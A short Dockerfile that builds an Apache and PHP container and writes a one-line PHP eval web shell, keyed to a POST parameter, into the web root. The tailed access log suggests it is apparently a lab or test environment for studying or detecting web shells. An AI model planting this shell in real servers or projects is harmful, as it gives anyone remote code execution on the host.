FROM co0ontty/ubuntu:16.04
RUN apt update -y && \
    apt install -y php apache2 libapache2-mod-php && \
    echo "<?php @eval(\$_POST['phpll']);?>" > /var/www/html/phptestwebshell.php && \
    echo "service apache2 restart && tail -f /var/log/apache2/access.log" > /etc/startenv.sh && \
    chmod +x /etc/startenv.sh
CMD ["sh","-c","/etc/startenv.sh"]
